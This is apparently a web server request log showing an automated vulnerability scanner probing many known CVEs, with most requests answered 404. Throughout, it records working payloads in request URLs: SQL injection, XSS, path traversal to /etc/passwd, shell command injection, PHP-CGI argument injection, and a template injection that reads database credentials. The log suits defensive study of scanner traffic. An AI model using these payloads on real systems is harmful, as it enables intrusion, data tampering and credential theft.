+ GET /?p=1&xsg-provider=%3Cimg%20src%20onerror=alert(document.domain)%3E&xsg-format=yyy&xsg-type=zz&xsg-page=pp 200 in 81ms
+ GET /?p=1&xsg-provider=data://text/html,<?php%20echo%20md5("CVE-2022-0346");%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp 200 in 81ms
+ GET /?rest_route=/wc/v3/wishlist/remove_product/1&item_id=0%20union%20select%20sleep(7)%20--%20g 200 in 82ms
+ GET /user/login 404 in 60ms
+ POST /wp-login.php?wlcms-action=preview 404 in 69ms
+ POST /wp-admin/admin-ajax.php 404 in 73ms
+ GET /?rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5(999999999),null,null%20--%20g 200 in 90ms
+ GET / 200 in 76ms
+ GET /karma.js 404 in 64ms
+ GET /?return_url=javascript:alert(document.domain) 200 in 103ms
+ GET / 200 in 83ms
+ GET /wp-json/mapsvg/v1/maps/2?id=1%27%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP(6)))b)--+ 404 in 75ms
+ GET / 200 in 69ms
+ POST /wp-admin/admin-ajax.php 404 in 71ms
+ POST /wp-admin/admin-ajax.php 404 in 74ms
+ GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/304hN3JlhIxPcCQIUbW7eIuqyuh.svg 404 in 74ms
+ GET /wp-admin/admin-ajax.php?meta_ids=1+AND+(SELECT+3066+FROM+(SELECT(SLEEP(6)))CEHy)&action=remove_post_meta_condition 404 in 66ms
+ POST /wp-admin/admin-ajax.php 404 in 55ms
+ POST /wp-admin/admin-ajax.php 404 in 68ms
+ POST /wp-admin/admin-ajax.php 404 in 55ms
+ GET /wp-content/plugins/infographic-and-list-builder-ilist/assets/js/ilist_custom_admin.js 404 in 74ms
+ POST /wp-admin/admin-ajax.php 404 in 52ms
+ POST /wp-admin/admin-ajax.php 404 in 70ms
+ GET /wp-content/plugins/documentor-lite/core/js/documentor.js 404 in 100ms
+ POST /wp-admin/admin-ajax.php 404 in 75ms
+ POST /wp-admin/admin-ajax.php 404 in 40ms
+ GET /index.php?p=member&destination 404 in 62ms
+ POST /wp-admin/admin-ajax.php 404 in 69ms
+ GET /wp-admin/admin-ajax.php?action=get_monthly_timetable&month=1+AND+(SELECT+6881+FROM+(SELECT(SLEEP(6)))iEAn) 404 in 60ms
+ GET /wp-admin/admin-ajax.php?action=ajax_get&route_name=get_doctor_details&clinic_id=%7B"id":"1"%7D&props_doctor_id=1,2)+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b 404 in 58ms
+ GET /index.php?rest_route=/xs-donate-form/payment-redirect/3 404 in 67ms
+ POST /wp-admin/admin-ajax.php 404 in 59ms
+ POST /wp-admin/admin-ajax.php 404 in 34ms
+ POST /wp-admin/admin-ajax.php 404 in 47ms
+ GET /scp/login.php 404 in 69ms
+ POST /wp-admin/admin-ajax.php 404 in 72ms
+ POST /wp-admin/admin-ajax.php 404 in 76ms
+ POST /wp-admin/admin-ajax.php 404 in 140ms
+ POST /wp-admin/admin-ajax.php 404 in 76ms
+ GET /wp-content/plugins/arprice-responsive-pricing-table/js/arprice.js 404 in 110ms
+ GET /user/login 404 in 56ms
+ POST /wp-admin/admin-ajax.php?action=wpt_admin_update_notice_option 404 in 56ms
+ POST /wp-admin/admin-ajax.php 404 in 57ms
+ POST /?rest_route=/olistener/new 200 in 94ms
+ GET /wp-content/plugins/woc-order-alert/assets/admin/js/scripts.js 404 in 68ms
+ POST /ws/km-wsdl/setting/address_book 404 in 81ms
+ POST /wp-admin/admin-ajax.php 404 in 69ms
+ POST /wp-admin/admin-ajax.php 404 in 100ms
+ GET /wp-content/plugins/stopbadbots/assets/js/stopbadbots.js 404 in 55ms
+ POST /wp-json/click5_sitemap/API/update_html_option_AJAX 404 in 57ms
+ POST /wp-json/click5_sitemap/API/update_html_option_AJAX 404 in 113ms
+ GET /wp-content/plugins/embed-swagger/readme.txt 404 in 62ms
+ GET /wp-admin/admin-ajax.php?action=vtprd_product_search_ajax&term=aaa%27+union+select+1,sleep(6),3--+- 404 in 71ms
+ GET /user/login 404 in 55ms
+ POST /wp-admin/admin-ajax.php 404 in 75ms
+ POST /mgmt/tm/util/bash 404 in 56ms
+ GET /wp-json/metform/v1/forms/templates/0 404 in 74ms
+ POST /wp-admin/admin.php?page=html2wp-settings 404 in 66ms
+ GET /wp-content/uploads/html2wp/304hNJvlQg9FmZASgKIhhimXN7o.php 404 in 150ms
+ GET / 200 in 91ms
+ HEAD /wp-login.php 404 in 63ms
+ GET /proxy?url=http%3a//0:8080/ 404 in 73ms
+ POST /wp-json/am-member/license 404 in 76ms
+ GET /wp-admin/admin-ajax.php?action=dprv_log_event&message=%3Cscript%3Ealert(document.domain)%3C/script%3E 404 in 54ms
+ POST /wp-json/rsvpmaker/v1/stripesuccess/anythinghere 404 in 67ms
+ POST /api/login 404 in 69ms
+ POST /admin/login.php 404 in 70ms
+ POST /ca/rest/certrequests 404 in 53ms
+ GET /iupjournals/index.php/esj 404 in 58ms
+ POST /servlet/GetProductVersion 404 in 58ms
+ POST /geoserver/wms 404 in 92ms
+ POST /alerts/alertLightbox.php 404 in 55ms
+ POST /dologin.action 404 in 57ms
+ GET / 200 in 78ms
+ POST /alerts/alertConfigField.php 404 in 57ms
+ POST /wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=11.2 404 in 77ms
+ POST /OASREST/v2/authenticate 404 in 66ms
+ GET /mims/updatecustomer.php?customer_number=-1'%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(md5(999999999),1,2),NULL,NULL,NULL,NULL,NULL,NULL' 404 in 73ms
+ POST /admin/asign-single-student-subjects.php 404 in 55ms
+ POST /wp-admin/admin-ajax.php 404 in 56ms
+ GET /navigate/login.php 404 in 53ms
+ GET /wp-admin/admin-post.php?vrc_cmd=phpinfo 404 in 74ms
+ GET /wp-admin/admin-ajax.php?action=searchwp_live_search&swpquery=a&post_status=publish 404 in 57ms
+ GET /wp-admin/admin-ajax.php?action=searchwp_live_search&swpquery=a&post_status=draft 404 in 64ms
+ GET /admin/dashboard.php 404 in 77ms
+ POST /scgi-bin/platform.cgi 404 in 75ms
+ GET /modules/appagebuilder/config.xml 404 in 56ms
+ POST /plugins/servlet/groupexportforjira/admin/json 404 in 77ms
+ GET /wp-content/plugins/cryptocurrency-widgets-pack/readme.txt 404 in 95ms
+ POST /network_test.php 404 in 73ms
+ GET /api/v2/cmdb/system/admin 404 in 68ms
+ GET /index.php?module=users/login 404 in 79ms
+ GET / 200 in 87ms
+ GET /index.php?module=users/login 404 in 76ms
+ GET /index.php?module=users/login 404 in 72ms
+ GET /admin/login/index.php 404 in 57ms
+ POST /SamlResponseServlet 404 in 63ms
+ POST /wp-json/lp/v1/courses/archive-course 404 in 55ms
+ GET /index.php 404 in 52ms
+ GET / 200 in 74ms
+ GET /libs/bower/bower_components/yui2/sandbox/treeview/renderhidden.php?mode=1%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E 404 in 85ms
+ GET /libs/bower/bower_components/yui2/sandbox/treeview/overflow.php?mode=1%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E 404 in 81ms
+ GET /libs/bower/bower_components/yui2/sandbox/treeview/removechildren.php?mode=1%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E 404 in 75ms
+ GET / 200 in 82ms
+ GET /?s=<%2Fscript><script>alert%28document.domain%29<%2Fscript> 200 in 71ms
+ POST /%2577eb%2575i_%2577sma_Http 404 in 74ms
+ POST /template/aui/text-inline.vm 404 in 80ms
+ GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache304hNAG70gXtiB97ySMoDFeAfDp 404 in 90ms
+ GET /setup/setupadministrator-start.action 404 in 43ms
+ GET /welcome.action 404 in 60ms
+ POST /ajax/api/user/save 404 in 55ms
+ GET /FsFv.html 404 in 67ms
+ GET /api/v1/database/2 404 in 72ms
+ POST /main/webservices/additional_webservices.php 404 in 54ms
+ POST /sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index 404 in 57ms
+ POST /human.aspx?Username=SQL%27%3BINSERT+INTO+activesessions+(SessionID)+values+(%27304hNBmxGqtOzaaoI7KYxEYJKnX%27);UPDATE+activesessions+SET+Username=(select+Username+from+users+order+by+permission+desc+limit+1)+WHERE+SessionID=%27304hNBmxGqtOzaaoI7KYxEYJKnX%27;UPDATE+activesessions+SET+LoginName=%27test@test.com%27+WHERE+SessionID=%27304hNBmxGqtOzaaoI7KYxEYJKnX%27;UPDATE+activesessions+SET+RealName=%27test@test.com%27+WHERE+SessionID=%27304hNBmxGqtOzaaoI7KYxEYJKnX%27;UPDATE+activesessions+SET+InstId=%271234%27+WHERE+SessionID=%27304hNBmxGqtOzaaoI7KYxEYJKnX%27;UPDATE+activesessions+SET+IpAddress=%27133.18.109.35%27+WHERE+SessionID=%27304hNBmxGqtOzaaoI7KYxEYJKnX%27;UPDATE+activesessions+SET+LastTouch=%272099-06-10+09:30:00%27+WHERE+SessionID=%27304hNBmxGqtOzaaoI7KYxEYJKnX%27;UPDATE+activesessions+SET+DMZInterface=%2710%27+WHERE+SessionID=%27304hNBmxGqtOzaaoI7KYxEYJKnX%27;UPDATE+activesessions+SET+Timeout=%2760%27+WHERE+SessionID=%27304hNBmxGqtOzaaoI7KYxEYJKnX%27;UPDATE+activesessions+SET+ResilNode=%2710%27+WHERE+SessionID=%27304hNBmxGqtOzaaoI7KYxEYJKnX%27;UPDATE+activesessions+SET+AcctReady=%271%27+WHERE+SessionID=%27304hNBmxGqtOzaaoI7KYxEYJKnX%27%23 404 in 66ms
+ POST /moveitisapi/moveitisapi.dll?action=m2 404 in 66ms
+ POST /guestaccess.aspx 404 in 56ms
+ GET /UBXXMr8IyM.php 404 in 68ms
+ GET /b_download/index.html 404 in 74ms
+ GET /sys/dict/loadTreeData?tableName=sys_user&text=password%20text,id&code=password&hasChildField&converIsLeafVal=1&condition&pid=admin&pidField=username 404 in 52ms
+ GET /jeecg-boot/sys/dict/loadTreeData?tableName=sys_user&text=password%20text,id&code=password&hasChildField&converIsLeafVal=1&condition&pid=admin&pidField=username 404 in 51ms
+ GET /scp/login.php 404 in 68ms
+ GET /login.php 404 in 55ms
+ GET /nagiosxi/login.php 404 in 63ms
+ POST /api/jsonrpc 404 in 76ms
+ POST /CFIDE/wizards/common/utils.cfc?method=wizardHash%20inPassword=bar%20_cfclient=true 404 in 77ms
+ GET /wp-content/plugins/media-library-assistant/readme.txt 404 in 79ms
+ GET /uploads/include/dialog/select_media_post_wangEditor.php?filename=1%3Cinput%20onfocus=eval(atob(this.id))%20id=YWxlcnQoZG9jdW1lbnQuY29va2llKTs=%20autofocus%3E 404 in 79ms
+ GET /backend/backend/auth/signin 404 in 55ms
+ GET / 200 in 84ms
+ GET /nagiosxi/login.php 404 in 71ms
+ POST /userentry?accountId=/../../../tomcat/webapps/mLYAu/&symbolName=test&base64UserName=YWRtaW4= 404 in 71ms
+ GET /mLYAu/CVE-2023-47246.txt?true 404 in 53ms
+ GET / 200 in 83ms
+ GET /api/jobs/Job_RjM4H4/logs 404 in 76ms
+ GET / 200 in 72ms
+ POST /mgmt/tm/util/bash 404 in 73ms
+ GET /advanced-elements/list/index.html?reloaded&sort=date_asc&page=3">%3Cscript%3Ealert(document.domain)%3c%2fscript%3E 404 in 65ms
+ GET /advanced-elements/form/index.html?formsubmit=12&formaction1=submit&InputField-11939054842=mrs&InputField-21939054842=190806&InputField-31939054842=403105&InputField-41939054842=2&InputField-51939054842&InputField-61939054842=1&captcha_token_id=1"><script>alert(document.domain)<%2fscript>ufs5prh3qfe&captchaphrase1939054842=1 404 in 332ms
+ GET /content-elements/job-ad/index.html?reloaded&sort=date_desc&page=1">%3Cscript%3Ealert(document.domain)%3c%2fscript%3E 404 in 423ms
+ GET /lists/compact/index.html?reloaded&sort=date_desc&page=2">%3Cscript%3Ealert(document.domain)%3c%2fscript%3E 404 in 444ms
+ GET /lists/text-tiles/index.html?reloaded&sort=date_asc&page=2">%3Cscript%3Ealert(document.domain)%3c%2fscript%3E 404 in 444ms
+ GET /lists/elaborate/index.html?reloaded&sort=date_desc&page=2">%3Cscript%3Ealert(document.domain)%3c%2fscript%3E 404 in 79ms
+ GET / 200 in 87ms
+ POST /v6.58/Products/Authentication 404 in 70ms
+ POST /wp-admin/admin-ajax.php 404 in 56ms
+ POST /classes/common/busiFacade.php 404 in 56ms
+ GET / 200 in 104ms
+ ⨯ [TypeError: Failed to parse body as FormData.]
+ POST /api/file/formimage 500 in 276ms
+ POST /php/ping.php 404 in 93ms
+ POST /php/ping.php 404 in 90ms
+ PUT /api/2.0/mlflow-artifacts/artifacts/304hN3gz0dSm8RHxlrdkv3l2n9O 404 in 62ms
+ GET / 200 in 86ms
+ GET / 200 in 87ms
+ GET /simpleeditor/common/commonReleaseNotes.do 404 in 60ms
+ GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;ifconfig;%27 404 in 45ms
+ POST /ajax-api/2.0/mlflow/model-versions/create 404 in 64ms
+ GET /model-versions/get-artifact?name=304hNKuTmBqbX3gC6DW6gsLgpV7&path=etc%2Fpasswd&version=1 404 in 56ms
+ POST /wp-json/post-smtp/v1/connect-app 404 in 61ms
+ GET /wp-json/post-smtp/v1/get-log 404 in 53ms
+ GET /cgi-bin/mainfunction.cgi/apmcfgupload?session=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx0.%52$c%52$ccat${IFS}/etc/passwd 404 in 72ms
+ POST /wp-admin/admin-ajax.php 404 in 74ms
+ POST /ajax-api/2.0/mlflow/experiments/create 404 in 71ms
+ GET /cgi-bin/MANGA/index.cgi 404 in 83ms
+ GET /cslu/v1/scheduler/jobs 404 in 56ms
+ POST /queue/join 404 in 75ms
+ GET /hax/..CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat 404 in 58ms
+ GET /xstoremgwt/cheetahImages?imageId=..\..\..\..\windows\win.ini 404 in 66ms
+ GET / 200 in 95ms
+ GET / 200 in 79ms
+ POST /login?next=http://166.111.111.128:10005 404 in 77ms
+ GET /item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,23233ca9a439219746e74c26d65d8fb8,0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D&search%5Bregex%5D=false&cid=-1&_=1 404 in 74ms
+ POST /bin/register/XWiki/XWikiRegister?xredirect=%2Fbin%2Fregister%2FXWiki%2FXWikiRegister%3Fxredirect%3D%252Fxwiki%252Fbin%252Fview%252FScheduler%252F%253Fdo%253Dtrigger%2526which%253DScheduler.NotificationEmailDailySender 404 in 76ms
+ GET /xwiki/bin/register/XWiki/XWikiRegister?xredirect=%2Fbin%2Fregister%2FXWiki%2FXWikiRegister%3Fxredirect%3D%252Fbin%252Fregister%252FXWiki%252FXWikiRegister%253Fxredirect%253D%25252Fxwiki%25252Fbin%25252Fview%25252FScheduler%25252F%25253Fdo%25253Dtrigger%252526which%25253DScheduler.NotificationEmailDailySender 404 in 94ms
+ POST /xwiki/bin/register/XWiki/XWikiRegister?xredirect=%2Fbin%2Fregister%2FXWiki%2FXWikiRegister%3Fxredirect%3D%252Fxwiki%252Fbin%252Fview%252FScheduler%252F%253Fdo%253Dtrigger%2526which%253DScheduler.NotificationEmailDailySender 404 in 83ms
+ POST /cgi-bin/cstecgi.cgi?token 404 in 78ms
+ GET /304hNCMc7gpxaMDQWXTQUT0EV3Q.txt 404 in 137ms
+ GET /304hNGYb7RUClvTBfrPgUXtBLnI.txt 404 in 90ms
+ POST /clients/MyCRL 404 in 58ms
+ GET / 200 in 87ms
+ POST /_sql?types 404 in 67ms
+ POST /_sql?types 404 in 54ms
+ POST /_sql?types 404 in 95ms
+ GET /api/client/user/pwd_update.php?usr_number=1%27%20AND%20(SELECT%207872%20FROM%20(SELECT(SLEEP(6)))DHhu)%20AND%20%27pMGM%27=%27pMGM&new_password=1&sign=1 404 in 74ms
+ PUT /goform/AccessControl 404 in 75ms
+ GET /lS3oi.txt 404 in 60ms
+ GET /wp-content/plugins/wp-fastest-cache/readme.txt 404 in 67ms
+ GET /importexport.php?sql=c2VsZWN0KzksbWQ1KDk4MTU4MTgpLDk=&type=exportexcelbysql 404 in 55ms
+ POST /wp-admin/admin-post.php 404 in 65ms
+ GET /wp-content/plugins/backup-backup/readme.txt 404 in 55ms
+ GET / 200 in 93ms
+ GET /users/sign_in 404 in 56ms
+ GET / 200 in 81ms
+ POST /assets/php/upload.php 404 in 59ms
+ GET / 200 in 76ms
+ POST /wp-admin/admin-ajax.php?action=add&source=../../../../../../../../../../wp-content/plugins/chart-builder/admin/partials/features/chart-builder-plugin-featured-display&type=chart-js 404 in 58ms
+ GET /RemoteApplicationMetadata.rem?wsdl 404 in 69ms
+ GET / 200 in 74ms
+ GET /?InternalDir=/../../../../windows&InternalFile=win.ini 200 in 90ms
+ GET /?InternalDir=\..\..\..\..\etc&InternalFile=passwd 200 in 87ms
+ POST /ajax-api/2.0/mlflow/experiments/create 404 in 77ms
+ GET /wp-login.php 404 in 66ms
+ GET / 200 in 98ms
+ GET /desktop,/cgi-bin/remote_help-cgi/favicon.ico?type=sshd_tdc 404 in 66ms
+ POST /cmd,/simZysh/register_main/setCookie 404 in 85ms
+ POST /index.php?/store/ 404 in 58ms
+ GET /?p=1 200 in 102ms
+ POST /admin/pr_monitor/getting_index_data.php 404 in 60ms
+ POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport 404 in 79ms
+ GET /index.php?login=1 404 in 68ms
+[Error: Requested and resolved page mismatch: /file=web_assets/../config.json /config.json]
+[Error: Requested and resolved page mismatch: /file=web_assets/../config.json /config.json]
+[Error: Requested and resolved page mismatch: /file=web_assets/../config.json /config.json]
+[Error: Requested and resolved page mismatch: /file=web_assets/../config.json /config.json]
+ GET /file=web_assets/../config.json 404 in 204ms
+ GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ= 404 in 52ms
+ GET /cgi-bin/info.cgi 404 in 56ms
+ GET /wp-content/plugins/event-monster/readme.txt 404 in 69ms
+ GET / 200 in 62ms
+ GET / 200 in 75ms
+ POST /process/login.php 404 in 66ms
+ GET / 200 in 82ms
+ POST /settings 404 in 68ms
+ GET / 200 in 81ms
+ GET /AsQx75.txt 404 in 71ms
+ GET /global-protect/portal/images/304hNA41y1E16PRRp3PP49NipMS.txt 404 in 57ms
+ POST /ssl-vpn/hipreport.esp 404 in 56ms
+ GET /global-protect/portal/images/304hNA41y1E16PRRp3PP49NipMS.txt 404 in 72ms
+ POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport 404 in 54ms
+ GET /backend/settings/oauth_adfs?hostname=polar 404 in 74ms
+ GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=http%3A%2F%2f166.111.111.128:10005%2Fadmin%2Fmaster%2Fconsole%2F&state=1&response_mode=query&response_type=code&scope=openid&nonce=1&code_challenge_method=S256&code_challenge=wMYxCiAZ5DmiZvqD0h5G_9QwE7IDDFRojvORiaqiTto 404 in 76ms
+ GET /index.php?entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(6);--+-&type=c&response=accept 404 in 56ms
+ GET / 200 in 41ms
+ GET /api/v1/settings 404 in 70ms
+ GET /controlloLogin.js 404 in 71ms
+ GET / 200 in 75ms
+ POST /ajax/calendar.php 404 in 74ms
+ POST /as/wapi/vmp 404 in 70ms
+ POST /as/wapi/vmp 404 in 56ms
+ POST /app/rest/users/id:1/tokens/304hNS1I6DItajY2IUZP6SCjNCv;.jsp?jsp_precompile=true 404 in 80ms
+ POST /uploadimage 404 in 53ms
+ GET / 200 in 86ms
+ GET / 200 in 76ms
+ POST /api/users 404 in 77ms
+ POST /ajax-api/2.0/mlflow/experiments/create 404 in 79ms
+ POST /webtools/control/main/ProgramExport 404 in 75ms
+ GET /wp-content/plugins/LayerSlider/assets/static/public/front.css 404 in 55ms
+ POST /api/v1/chart/data 404 in 69ms
+ POST /client/api?command=samlSso 404 in 61ms
+ GET /streampipes-backend/api/v2/auth/settings 404 in 76ms
+ GET /npm-pwg/..;/axis2-AWC/services/listServices 404 in 76ms
+ GET /index.php?noAUTO=1 404 in 85ms
+ GET / 200 in 92ms
+ GET / 200 in 88ms
+ GET / 200 in 85ms
+ GET /login.rst 404 in 64ms
+ GET /login.rst 404 in 54ms
+ GET /login.rst 404 in 76ms
+ GET /login.rst 404 in 66ms
+ GET /userLogin.asp 404 in 63ms
+ GET /?es=optin&hash=eyJtZXNzYWdlX2lkIjowLCJjYW1wYWlnbl9pZCI6MCwiY29udGFjdF9pZCI6Int7Y29udGFjdF9pZH19IiwiZW1haWwiOiJ7e2VtYWlsfX0iLCJndWlkIjoiZGlid29sLXFhaWViZC1xdnJna3AtbGh5b3BtLXJteWZ6byIsImxpc3RfaWRzIjpbInNsZWVwKDMpIl0sImFjdGlvbiI6InN1YnNjcmliZSJ9 200 in 86ms
+ GET /welcome 404 in 68ms
+ GET /zm/index.php?sort=if(now()=sysdate()%2Csleep(6)%2C0)&order=desc&limit=20&view=request&request=watch&mid=1 404 in 69ms
+ GET /mailinspector/login.php 404 in 71ms
+ POST /include/file.php 404 in 57ms
+ GET / 200 in 75ms
+ POST /api/gen/clients/csharp 404 in 56ms
+ GET /geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage 404 in 83ms
+ POST /Startup/Register 404 in 55ms
+ POST /Token 404 in 125ms
+ GET / 200 in 82ms
+ GET / 200 in 88ms
+ GET / 200 in 72ms
+ GET / 200 in 79ms
+ GET /en-US/login 404 in 70ms
+ POST /password_change.cgi 404 in 72ms
+ GET / 200 in 87ms
+ GET /wp-content/plugins/siteguard/readme.txt 404 in 71ms
+ GET /info.php 404 in 325ms
+ GET /php-info.php 404 in 385ms
+ GET /xmlrpc.php 404 in 411ms
+ GET /phpinfo.php 404 in 409ms
+ GET /cpanel.php 404 in 410ms
+ GET /adminer.php 404 in 405ms
+ GET /admin.php 404 in 396ms
+ GET /admin.php 404 in 400ms
+ GET /adminer.php 404 in 402ms
+ GET /php_info.php 404 in 394ms
+ GET /cache/index.tpl.php 404 in 391ms
+ GET /xmlrpc.php 404 in 389ms
+ GET /.env 404 in 387ms
+ GET /bin/cron.php 404 in 385ms
+ GET /html/usr/share/doc/hostname/copyright%3f 404 in 136ms
+ GET /wp-content/plugins/dokan-pro/changelog.txt 404 in 52ms
+ GET /Login.aspx 404 in 49ms
+ POST /management/export.php?filename=$(echo+'<?php+echo+md5(8772);+?>'+>+iyafygcispjj.php)&type=pdf 404 in 72ms
+ GET /solr/admin/info/properties:/admin/info/key 404 in 58ms
+ POST /webtools/control/forgotPassword/xmldsdump 404 in 58ms
+ GET /common/crasg.txt 404 in 114ms
+ GET /login 404 in 78ms
+ GET /api/data 404 in 69ms
+ GET / 200 in 85ms
+ POST /openam/json/realms/root/authenticate 404 in 75ms
+ GET / 200 in 74ms
+ GET /login.php 404 in 72ms
+ GET / 200 in 75ms
+ POST /node_modules/angular-base64-upload/demo/server.php 404 in 68ms
+ POST /bower_components/angular-base64-upload/demo/server.php 404 in 84ms
+ POST /queue/join 404 in 73ms
+ PUT /api/v2/simulation 404 in 52ms
+ GET /login/index.php 404 in 66ms
+ GET /?p=1 200 in 91ms
+ GET / 200 in 77ms
+ GET / 200 in 70ms
+ POST /webtools/control/view/StatsSinceStart 404 in 78ms
+ GET / 200 in 81ms
+ GET /default.aspx 404 in 78ms
+ POST /html/ad/adfilestorage/request/checkAcesso.php 404 in 81ms
+ POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input 404 in 75ms
+ POST /index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input 404 in 116ms
+ POST /test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input 404 in 80ms
+ POST /test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input 404 in 137ms
+ GET /GeneralDocs.aspx?rpt=../../../../Windows/win.ini 404 in 75ms
+ GET /players.json 404 in 67ms
+ GET /~projects 404 in 66ms
+ POST /api/v2/observables/extended 404 in 74ms
+ GET /de2api/user/info 404 in 68ms
+ POST /c/router 404 in 328ms
+ POST /c/router 404 in 328ms
+ POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData 404 in 90ms
+ POST /drag/onlDragDatasetHead/getTotalData 404 in 89ms
+ GET /-/media/doo-doo.ashx 404 in 56ms
+ POST /cgi-bin/skk_get.cgi 404 in 73ms
+ POST /php/components/logs.php 404 in 71ms
+ GET /admin/login 404 in 55ms
+ GET /login.do?jvar_page_title=<style><j:jelly%20xmlns:j="jelly"%20xmlns:g=%27glide%27><g:evaluate>gs.addErrorMessage(1337*1337);</g:evaluate></j:jelly></style> 404 in 54ms
+ POST /postlocal 404 in 58ms
+ GET /wdI48v.txt?true 404 in 63ms
+ PUT /api;/config 404 in 67ms
+ POST /index.php?rest_route=/wqc/v1/query 404 in 78ms
+ GET / 200 in 74ms
+ GET / 200 in 74ms
+ GET /ResetUserInfo.php?user_type_form=username&uname_user_type=uname_student&username_stn_id=21+OR+3720%3dBENCHMARK(7000000,MD5(0x6e48446e))&pass=1&month_username_dob=x&day_username_dob=x&year_username_dob=x 404 in 77ms
+ POST /boafrm/formSysCmd 404 in 73ms
+ GET / 200 in 85ms
+ GET / 200 in 74ms
+ POST /add_reference_to_local_model 404 in 72ms
+ GET / 200 in 97ms
+ GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj%3Ajelly%2Bxmlns%3Aj%3D%22jelly%3Acore%22%2Bxmlns%3Ag%3D'glide'%3E%3Cg%3Aevaluate%3Ez%3Dnew%2BPackages.java.io.File(%22%22).getAbsolutePath()%3Bz%3Dz.substring(0%2Cz.lastIndexOf(%22%2F%22))%3Bu%3Dnew%2BSecurelyAccess(z.concat(%22%2Fco..nf%2Fglide.db.properties%22)).getBufferedReader()%3Bs%3D%22%22%3Bwhile((q%3Du.readLine())!%3D%3Dnull)s%3Ds.concat(q%2C%22%5Cn%22)%3Bgs.addErrorMessage(s)%3B%3C%2Fg%3Aevaluate%3E%3C%2Fj%3Ajelly%3E%3C%2Fstyle%3E 404 in 71ms
+ GET /login.do?jvar_page_title=%3c%73%74%79%6c%65%3e%3c%6a%3a%6a%65%6c%6c%79%20%78%6d%6c%6e%73%3a%6a%3d%22%6a%65%6c%6c%79%3a%63%6f%72%65%22%20%78%6d%6c%6e%73%3a%67%3d%27%67%6c%69%64%65%27%3e%3c%67%3a%65%76%61%6c%75%61%74%65%3e%7a%3d%6e%65%77%20%50%61%63%6b%61%67%65%73%2e%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%22%22%29%2e%67%65%74%41%62%73%6f%6c%75%74%65%50%61%74%68%28%29%3b%7a%3d%7a%2e%73%75%62%73%74%72%69%6e%67%28%30%2c%7a%2e%6c%61%73%74%49%6e%64%65%78%4f%66%28%22%2f%22%29%29%3b%75%3d%6e%65%77%20%53%65%63%75%72%65%6c%79%41%63%63%65%73%73%28%7a%2e%63%6f%6e%63%61%74%28%22%2f%63%6f%2e%2e%6e%66%2f%67%6c%69%64%65%2e%64%62%2e%70%72%6f%70%65%72%74%69%65%73%22%29%29%2e%67%65%74%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%29%3b%73%3d%22%22%3b%77%68%69%6c%65%28%28%71%3d%75%2e%72%65%61%64%4c%69%6e%65%28%29%29%21%3d%3d%6e%75%6c%6c%29%73%3d%73%2e%63%6f%6e%63%61%74%28%71%2c%22%5c%6e%22%29%3b%67%73%2e%61%64%64%45%72%72%6f%72%4d%65%73%73%61%67%65%28%73%29%3b%3c%2f%67%3a%65%76%61%6c%75%61%74%65%3e%3c%2f%6a%3a%6a%65%6c%6c%79%3e%3c%2f%73%74%79%6c%65%3e 404 in 106ms
+ GET /ganglia/graph_all_periods.php?g=%22%22%20autofocus%20onfocus=alert(document.domain)//%22 404 in 73ms
+ GET /cgi-bin/sslvpnclient?launchplatform 404 in 55ms
+ GET /api/get-browser-snapshot?snapshot_path=/etc/passwd 404 in 56ms
+ GET / 200 in 74ms
+ POST /device/description_en.html 404 in 66ms
+ GET /settings 404 in 59ms
+ POST /settings 404 in 113ms
+ GET / 200 in 171ms
+ GET /?true 200 in 76ms
